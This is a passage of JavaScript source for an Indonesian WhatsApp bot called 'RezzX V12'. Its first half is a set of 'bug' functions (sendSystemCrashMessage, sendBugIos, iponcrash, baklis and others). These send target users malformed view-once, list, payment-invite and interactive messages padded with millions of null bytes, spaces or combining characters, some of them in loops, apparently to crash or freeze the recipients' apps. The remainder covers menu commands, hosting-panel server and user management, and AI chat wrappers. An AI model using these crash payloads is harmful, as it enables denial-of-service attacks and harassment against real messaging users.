            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await rezzx.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥............ ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌'+"".repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': fs.readFileSync ('./rzv/virgam.png'),
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await rezzx.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': "RezzX"
          },
          'body': {
            'text': "NOT VX - REZZX V12🍀"
          },
          'footer': {
            'text': '.rezzx'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'REZZX IN FOR FAMAOUS', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await rezzx.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  rezzx.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '_🍀 Not RezzX V12 🍀_',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥............ ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    await sleep(1500)
    sendLiveLocationMessage(jid);
    await sleep(2000)
    sendSystemCrashMessage(jid);
    await sleep(1500);
    sendSystemCrashMessage(jid);
    await sleep(1500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    await sleep(1500)
    sendSystemCrashMessage(jid);
    await sleep(2000)
    sendSystemCrashMessage(jid);
    await sleep(1500);
    sendSystemCrashMessage(jid);
    await sleep(1500);
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: `NOT VX - REZZX V12🍀`
}
}
}

async function iponcrash(target) {
await rezzx.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await rezzx.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
sleep(200)
await rezzx.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await rezzx.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await rezzx.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
}

async function bughomebutton(jid) {
var etc = generateWAMessageFromContent(jid, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "NOT VX - REZZX V12🍀"
    },
    "footer": {
      "text": "© NOT VX - REZZX V12🍀"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'NOT VX - REZZX V12🍀', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: jid, quoted: m })
await rezzx.relayMessage(jid, etc.message, { messageId: etc.key.id })
}

async function sendBugIos(jid) {
iponcrash(jid)
sleep(1500)
sendExtendedTextMessage(jid)
sendVariousMessages(jid)
sendSystemCrashMessage(jid)
}

//FUNC BUG V2 BY ABY 

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./rzv/anu.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍A̶̞͉͈͔͋̔͋͊̂͑̍̔̆͜b̵̹́̿͂y̵̠̟͙͍͍̠̹̮̯̐̓z̸̧̗̬̺͙̺͔̱̘̮̆̔z̷̲͖͒̈̑͛̊̕̚ͅX̶̛̮͒̿̑́̏̂̈́̚Ą̷̩̠̞͂́ơ̵̡̛̿̉́̃̇̚s̷̼̭̘̐͛͒͋͝ĥ̸̢̩̪͆̊̇̅̈́͆̔̉i̴̲̿͂̈́̽̓͝ ̷͍̱͓͛͑#̵̖̞́̈͗́̑̈́͆̉̕E̵̢̢̜͓̭̪̰͕̠͋̏̌̈́͛̃͜z̵̧̙̜͓̹̜͛̈́̌͘̕͝C̴̮͓̞̊͛̓́͌r̸̲̖͉̩͛̏a̴̡̛̞̩͋̇̈́s̸̢͍͙̰̺͒́́̿̈́̚͘͝͝ͅh̵͍̬̤͊́̽̈̑̊̕ͅཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}
const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `pois0n - dark`
}
}
}

const ryobut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: 'pois0n - dark',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}
//=================================================//
async function aipong(target) {
await rezzx.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥............ ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌"+" ".repeat(920000),
        'footerText': `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥............ ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌`,
        'description': `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥............ ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: ryobug });
await rezzx.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Halo Pengguna Sc RezzX`
}}}


//batas bug

// respons list button 
if (m.mtype === "interactiveResponseMessage"){  
            let msg = m.message[m.mtype]  || m.msg
            if(msg.nativeFlowResponseMessage  && !m.isBot  ){ 
                let { id } = JSON.parse(msg.nativeFlowResponseMessage.paramsJson) || {}  
                if(id){
                    let emit_msg = { 
                        key : { ...m.key } ,
                        message:{ extendedTextMessage : { text : id } } ,
                        pushName : m.pushName,
                        messageTimestamp  : m.messageTimestamp || 754785898978
                    }
                    return rezzx.ev.emit("messages.upsert" , { messages : [ emit_msg ] ,  type : "notify"})
                }
            }
        }       

switch (command) {
//PaketMenu
case 'menuowner':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menuowner } = require('./lib/listmenu.js')
let menunya0 = menuowner( isPremium, sender, ball, prefix )
let own = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya0, own)
break
case 'menustore':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menustore } = require('./lib/listmenu.js')
let menunya1 = menustore( isPremium, sender, ball, prefix )
let str = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya1, str)
break
case 'menufun':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menufun } = require('./lib/listmenu.js')
let menunya2 = menufun( isPremium, sender, ball, prefix )
let fun = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya2, fun)
break
case 'menugroup':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menugroup } = require('./lib/listmenu.js')
let menunya3 = menugroup( isPremium, sender, ball, prefix )
let gru = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya3, gru)
break
case 'menutools':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menutools } = require('./lib/listmenu.js')
let menunya4 = menutools( isPremium, sender, ball, prefix )
let tol = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya4, tol)
break
case 'menudownload':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menudownload } = require('./lib/listmenu.js')
let menunya5 = menudownload( isPremium, sender, ball, prefix )
let dll = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya5, dll)
break
case 'menuai':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menuai } = require('./lib/listmenu.js')
let menunya6 = menuai( isPremium, sender, ball, prefix )
let aii = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya6, aii)
break
case 'menuanime':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menuanime } = require('./lib/listmenu.js')
let menunya7 = menuanime( isPremium, sender, ball, prefix )
let nim = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya7, nim)
break
case 'menurpg':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menurpg } = require('./lib/listmenu.js')
let menunya8 = menurpg( isPremium, sender, ball, prefix )
let rpg = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya8, rpg)
break
case 'menurandom':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menurandom } = require('./lib/listmenu.js')
let menunya9 = menurandom( isPremium, sender, ball, prefix )
let rmm = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya9, rmm)
break
case 'menusearch':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menusearch } = require('./lib/listmenu.js')
let menunya10 = menusearch( isPremium, sender, ball, prefix )
let src = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya10, src)
break
case 'menuislam':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menuislam } = require('./lib/listmenu.js')
let menunya11 = menuislam( isPremium, sender, ball, prefix )
let isl = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya11, isl)
break
case 'menuephoto':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menuephoto } = require('./lib/listmenu.js')
let menunya12 = menuephoto( isPremium, sender, ball, prefix )
let eph = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya12, eph)
break
case 'menuhacking':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menuhacking } = require('./lib/listmenu.js')
let menunya13 = menuhacking( isPremium, sender, ball, prefix )
let hck = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya13, hck)
break
case 'menumaker':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menumaker } = require('./lib/listmenu.js')
let menunya14 = menumaker( isPremium, sender, ball, prefix )
let mkr = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya14, mkr)
break
case 'menusticker':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menusticker } = require('./lib/listmenu.js')
let menunya15 = menusticker( isPremium, sender, ball, prefix )
let stt = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya15, stt)
break
case 'menutextpro':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menutextpro } = require('./lib/listmenu.js')
let menunya16 = menutextpro( isPremium, sender, ball, prefix )
let tpr = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya16, tpr)
break
case 'menucpanel':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menucpanel } = require('./lib/listmenu.js')
let menunya17 = menucpanel( isPremium, sender, ball, prefix )
let cpn = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya17, cpn)
break
case 'menubug':
if (cekUser("id", sender) == null) return m.reply(mess.reg)
if (isBan) return m.reply(mess.ban)
let { menubug } = require('./lib/listmenu.js')
let menunya18 = menubug( isPremium, sender, ball, prefix )
let bug = 'https://telegra.ph/file/6a116c70af524b3923b2d.jpg'
xreply(menunya18, bug)
break
//EndPaket

case 'startsrv': case 'stopsrv': case 'restartsrv': {
if (!isOwner) return m.reply(mess.owner)
let action = command.replace('srv', '')
let srv = args[0]
if (!srv) return m.reply('*PERMINTAAN ERROR!! PESAN:*\n> masukkan id server')
let f = await fetch(domain + "/api/client/servers/" + srv + "/power", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"signal": action
})
})

let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
m.reply(`*SUCCESS ${action.toUpperCase()} SERVER*`)
}
break

case 'delsrv': {
if (!isOwner) return m.reply(mess.owner)
let srv = args[0]
if (!srv) return m.reply('*PERMINTAAN ERROR!! PESAN:*\n> masukkan id server')
let f = await fetch(global.domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply795('*NOT FOUND*')
m.reply(`*SERVER DENGAN ID ${srv} SUCCESS DELETED*`)
}
break

case 'delusr': {
if (!isOwner) return m.reply(mess.owner)
let usr = args[0]
if (!usr) return m.reply('*PERMINTAAN ERROR!! PESAN:*\n> masukkan id user')
let f = await fetch(global.domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*NOT FOUND*')
m.reply(`*USER DENGAN ID ${usr} SUCCESS DELETED*`)
}
break

case 'addsrv': {
if (!isOwner) return m.reply(mess.owner)
let s = q.split(',');
if (s.length < 7) return m.reply(`*PERMINTAAN EROR!! CONTOH:*\n> .addsrv name,desc,userId,egg,locId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];

let f1 = await fetch(global.domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
m.reply(`*SUCCESS CREATE SERVER*

📄 ID : ${server.id}*
📋 UUID : ${server.uuid}
🔖 NAME : ${server.name}
📝 DESC : ${server.description}
🔧 MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
💽 DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
💾 CPU: ${server.limits.cpu}%
📆 DATE : ${server.created_at}`)
}
break

case 'addusr': {
if (!isOwner) return m.reply(mess.owner)
let t = q.split(',');
if (t.length < 3) return m.reply(`*PERMINTAAN ERROR!! CONTOH:*\n> .addusr email,username,nama,nomor`);
let email = t[0];
let username = t[1];
let name = t[2];
let password = makeid(8);
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*PERMINTAAN ERROR!! CONTOH:*\n> .addusr email,username,nama,nomor`);
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Member",
"root_admin": false,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes

let p = await rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/ceb0b196cce0992ca2592.png' }, caption: `*USER SUKSES DIBUAT*

📄 id: ${user.id}
🔖 username: ${user.username}
📧 email: ${user.email}
👤 name: ${user.first_name} ${user.last_name}
🀄 bahasa: ${user.language}
💎 admin: ${user.root_admin}
📆 created at: ${user.created_at}

📝 note: detail lengkap user @${u.split`@`[0]} dikirim di private chat.`, mentions:[u],
}, {quoted: m})
rezzx.sendMessage(u, { image: { url: 'https://telegra.ph/file/353a52df5a2c2d699f31b.png' }, caption: `*THIS YOUR ACCOUNT*

📧 email: ${email}
👤 username: ${username}
📌 password: ${password}
🔒 login: ${global.domain}

📝 note: jaga informasi anda, admin hanya memberik 1x info!.`,
}).catch((err) => m.reply(`*DETAIL ACCOUNT*

📧 email : ${email}
👤 username : ${username}
📌 password : ${password}
🔒 login : ${global.domain}`))
}
break

case 'listusr': {
let page = args[0] ? args[0] : '1'
let f = await fetch(global.domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let res = await f.json();
let users = res.data
let sections = "*DATA USER PANEL*"
for (let user of users) {
let u = user.attributes
sections += `\n\n*ID:* ${u.id}\n*First Name:* ${u.username}\n*Last Name :* ${u.last_name}\n*Admin :* ${u.root_admin}\n*Bahasa :* ${u.language}`
}
m.reply(sections.trim())
}
break

case "listsrv": {
let page = args[0] ? args[0] : '1'
let f = await fetch(global.domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let res = await f.json();
let servers = res.data
let sections = "*DATA SERVER PANEL*"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(global.domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apicred
}
})
let data = await f3.json();

sections += `\n\n*Id:* ${s.id}\n*Server Name:* ${s.name}\n\n`
}
m.reply(sections.trim())
}
break

case 'lepton':
    if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH:*\n> .${command} halo kamu siapa?`)
    try {
         wett()
         let le = await (await fetch(`https://api.shannmoderz.xyz/ai/lepton?query=${text}`)).json();
         let ep = 'LEPTON AI'
         let to = 'session: false'
         let on = 'https://telegra.ph/file/ae548b1ab2788d71f7b9a.png'
         replyai(le.result, ep, to, on);
    } catch (e) {
        m.reply(mess.error);
    }
    okk()
    break

case 'claude':
    if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH:*\n> .${command} halo kamu siapa?`)
    try {
         wett()
         let cl = await (await fetch(`https://api.shannmoderz.xyz/ai/claude?query=${text}`)).json();
         let ud = 'CLAUDE AI'
         let au = 'session: false'
         let de = 'https://telegra.ph/file/7c936cba38af9ff9b6512.png'
         replyai(cl.result, ud, au, de);
    } catch (e) {
        m.reply(mess.error);
    }
    okk()
    break

case 'blackbox':
    if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH:*\n> .${command} halo kamu siapa?`)
    try {
         wett()
